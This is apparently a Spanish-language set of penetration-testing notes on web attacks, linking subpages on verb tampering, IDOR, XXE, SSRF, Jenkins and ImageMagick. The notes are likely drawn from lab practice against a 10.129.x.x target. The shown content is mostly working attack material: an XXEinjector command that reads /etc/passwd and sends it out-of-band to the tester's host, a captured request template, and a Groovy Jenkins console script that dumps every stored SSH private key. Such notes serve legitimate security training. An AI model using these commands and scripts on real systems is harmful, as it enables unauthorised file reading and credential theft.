# Other Web Attacks (HTTP verb Tampering, IDOR & XXE)

- [HTTP verb tampering](./http-verb-tampering.md)
- [IDOR (Insecure Direct Object Reference)](./idor.md)
- [XXE (XML External Entity)](./xxe.md)
- [Attacking Jenkins](./attacking-jenkins.md)
- [SSRF](./ssrf.md)
- [ImageMagick RCE](./imagemagick-rce.md)
- Podemos utilizar [XXEinjector](https://github.com/enjoiz/XXEinjector) para automatizar el proceso de inyección de XML externa.
- `ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter` Nos tenemos que guardar la petición HTTP de burp

```
POST /blind/submitDetails.php HTTP/1.1

Host: 10.129.197.101

Content-Length: 140

Accept-Language: en-US,en;q=0.9

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36

Content-Type: text/plain;charset=UTF-8

Accept: */*

Origin: http://10.129.197.101

Referer: http://10.129.197.101/

Accept-Encoding: gzip, deflate, br

Connection: keep-alive



<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```


## Jenkins script que busca clave SSH

```groovy
import com.cloudbees.plugins.credentials.CredentialsProvider
import com.cloudbees.plugins.credentials.common.StandardUsernameCredentials
import com.cloudbees.jenkins.plugins.sshcredentials.impl.BasicSSHUserPrivateKey
import hudson.model.*

// Buscar todas las credenciales en el sistema
def creds = CredentialsProvider.lookupCredentials(
    BasicSSHUserPrivateKey.class, 
    Jenkins.instance, 
    null, 
    null
)

// Iterar sobre las credenciales y mostrar las claves privadas
creds.each { cred ->
    println "ID: ${cred.id}"
    println "Description: ${cred.description}"
    println "Private Key: ${cred.privateKey}"
    println "----------------------------------------"
}
```